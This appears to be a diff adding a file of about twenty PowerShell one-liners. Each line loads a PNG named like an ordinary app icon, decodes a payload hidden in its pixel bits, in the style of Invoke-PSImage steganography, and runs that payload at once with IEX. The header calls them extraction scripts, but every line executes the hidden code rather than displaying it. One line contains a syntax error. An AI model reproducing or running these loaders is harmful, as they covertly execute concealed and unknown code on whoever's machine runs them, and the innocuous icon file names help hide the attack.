@@ -1,0 +1,44 @@
+#To extract the payload from images crafted by Invoke-PSImage, run the following scripts in Windows PowerShell terminal.
+
+
+sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap("applovin_ic_mediation_line.png");$o=a Byte[] 360;(0..4)|%{foreach($x in(0..71)){$p=$g.GetPixel($x,$_);$o[$_*72+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..355]))
+
+sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap("abc_ic_commit_search_api_mtrl_alpha.png");$o=a Byte[] 384;(0..7)|%{foreach($x in(0..47)){$p=$g.GetPixel($x,$_);$o[$_*48+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..355]))
+
+sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap("abc_btn_check_to_on_mtrl_000.png");$o=a Byte[] 384;(0..7)|%{foreach($x in(0..47)){$p=$g.GetPixel($x,$_);$o[$_*48+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..355]))
+
+sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap("node_modules_reactnavigation_drawer_src_views_assets_toggledrawericon.png");$o=a Byte[] 360;(0..4)|%{foreach($x in(0..71)){$p=$g.GetPixel($x,$_);$o[$_*72+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..355]))
+
+sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap("exo_icon_fullscreen_enter.png");$o=a Byte[] 360;(0..4)|%{foreach($x in(0..71)){$p=$g.GetPixel($x,$_);$o[$_*72+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..355]))
+
+sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap("exo_icon_play.png");$o=a Byte[] 384;(0..7)|%{foreach($x in(0..47)){$p=$g.GetPixel($x,$_);$o[$_*48+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..355]))
+
+sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap("fb_ic_magnifying_glass_filled_16.png");$o=a Byte[] 384;(0..7)|%{foreach($x in(0..47)){$p=$g.GetPixel($x,$_);$o[$_*48+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..355]))
+
+sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap("instagram_icon.png");$o=a Byte[] 360;(0..4)|%{foreach($x in(0..71)){$p=$g.GetPixel($x,$_);$o[$_*72+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..355]))
+
+sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap("back_white.png");$o=a Byte[] 384;(0..7)|%{foreach($x in(0..47)){$p=$g.GetPixel($x,$_);$o[$_*48+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..355]))
+
+sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap("mcd_launcher.png");$o=a Byte[] 360;(0..4)|%{foreach($x in(0..71)){$p=$g.GetPixel($x,$_);$o[$_*72+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..355]))
+
+sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap("ic_info_outline_black_48dp.png");$o=a Byte[] 360;(0..4)|%{foreach($x in(0..71)){$p=$g.GetPixel($x,$_);$o[$_*72+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..355]))
+
+sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap("checkout_icon_select_img_selected_brown.png");$o=a Byte[] 360;(0..4)|%{foreach($x in(0..71)){$p=$g.GetPixel($x,$_);$o[$_*72+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..355]))
+
+sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap("sui_icon_coupon_discount.png");$o=a Byte[] 384;(0..7)|%{foreach($x in(0..47)){$p=$g.GetPixel($x,$_);$o[$_*48+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..355]))
+
+sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap("msg_colors.png");$o=a Byte[] 360;(0..4)|%{foreach($x in(0..71)){$p=$g.GetPixel($x,$_);$o[$_*72+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..355]))
+
+sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap("msg_mini_addstory.png");$o=a Byte[] 384;(0..7)|%{foreach($x in(0..47)){$p=$g.GetPixel($x,$_);$o[$_*48+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..355]))
+
+sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap("bwr.png");$o=a Byte[] 360;(0..4)|%{foreach($x in 0..71)){$p=$g.GetPixel($x,$_);$o[$_*72+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..355]))
+
+sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap("d6x.png");$o=a Byte[] 384;(0..7)|%{foreach($x in(0..47)){$p=$g.GetPixel($x,$_);$o[$_*48+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..355]))
+
+sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap("ic_forward_white.png");$o=a Byte[] 360;(0..4)|%{foreach($x in(0..71)){$p=$g.GetPixel($x,$_);$o[$_*72+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..355]))
+
+sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap("ic_store_small.png");$o=a Byte[] 384;(0..7)|%{foreach($x in(0..47)){$p=$g.GetPixel($x,$_);$o[$_*48+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..355]))
+
+sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap("cast_abc_scrubber_control_to_pressed_mtrl_000.png");$o=a Byte[] 384;(0..7)|%{foreach($x in(0..47)){$p=$g.GetPixel($x,$_);$o[$_*48+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..355]))
+
+sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap("quantum_ic_video_youtube_grey600_18.png");$o=a Byte[] 360;(0..4)|%{foreach($x in(0..71)){$p=$g.GetPixel($x,$_);$o[$_*72+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..355]))
